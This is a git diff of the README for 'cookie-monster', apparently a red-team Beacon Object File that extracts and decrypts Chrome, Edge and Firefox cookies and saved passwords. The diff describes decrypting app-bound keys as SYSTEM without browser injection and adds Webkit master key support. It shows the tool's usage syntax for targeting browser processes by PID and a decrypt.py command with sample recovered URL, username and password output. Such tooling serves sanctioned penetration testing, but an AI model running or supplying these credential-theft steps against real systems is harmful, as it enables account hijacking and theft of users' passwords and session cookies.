@@ -7,8 +7,10 @@ Once the Cookies/Login Data file(s) are downloaded, the python decryption script
 
 Chrome & Edge 127+ Updates: new chromium browser cookies (v20) use the app bound key to encrypt the cookies. As a result, this makes retrieving the app_bound_encrypted_key slightly more difficult. Thanks to [snovvcrash](https://gist.github.com/snovvcrash/caded55a318bbefcb6cc9ee30e82f824) this process can be accomplished without having to escalate your privileges. The catch is your process must be running out of the web browser's application directory. i.e. must inject into Chrome/Edge or spawn a beacon from the same application directory as the browser. 
 
-Latest update allows you to decrypt cookies as SYSTEM and without having to inject into the browser process! Shoutout to @sdemius for the discovering how to decrypt the Chrome's [PostProcessData](https://source.chromium.org/chromium/chromium/src/+/main:chrome/elevation_service/elevator.cc;l=216;bpv=1) function and @b1scoito [explanation](https://github.com/moonD4rk/HackBrowserData/issues/431#issuecomment-2606665195)! Chrome 137+ changed the PostProcessData() function once again, shoutout to [@runassu](https://github.com/runassu/chrome_v20_decryption) for figuring it out! 
- 
+Decrypt cookies as SYSTEM and without having to inject into the browser process! Shoutout to @sdemius for the discovering how to decrypt the Chrome's [PostProcessData](https://source.chromium.org/chromium/chromium/src/+/main:chrome/elevation_service/elevator.cc;l=216;bpv=1) function and @b1scoito [explanation](https://github.com/moonD4rk/HackBrowserData/issues/431#issuecomment-2606665195)! Chrome 137+ changed the PostProcessData() function once again, shoutout to [@runassu](https://github.com/runassu/chrome_v20_decryption) for figuring it out! 
+
+Latest update added decryption of Webkit Master Key thanks to @M1ndo. The master key is automatically decrypted along side the app bound key. To utilize it, add the key to the Python decrypt script. Primarily see this key used when roaming profiles are in use, stored passwords in Edge, or older stored passwords.
+
 ## BOF Usage
 ```
 Usage: cookie-monster [--chrome || --edge || --system <Local State File Path> <PID> || --firefox || --chromeCookiePID <PID> || --chromeLoginDataPID <PID> || --edgeCookiePID <PID> || --edgeLoginDataPID <PID> ] [--cookie-only] [--key-only] [--login-data-only] [--copy-file "C:\Folder\Location\"] 
@@ -62,6 +64,8 @@ options:
   -f FILE, --file FILE  Location of the database file
   --chrome-aes-key CHROME_AES_KEY
                         Chrome AES Key
+  -mk MASTER_KEY, --master-key MASTER_KEY
+                        Old key used in v10 passwords
 ```
 
 Examples:
@@ -98,7 +102,11 @@ Import cookies JSON file with https://cookie-editor.com/
 
 Decrypt Chome/Edge Passwords File
 ```
-python .\decrypt.py -k "\xec\xfc...." -o passwords ChromePasswords.db
+python3 decrypt.py -o passwords -f EdgePasswords.db -k '\xf9\x...' -mk '\xf3\x..'
+
+URL: https://test.com/
+Username: adgf
+Password: pass
 
 Results Example:
 -----------------------------------
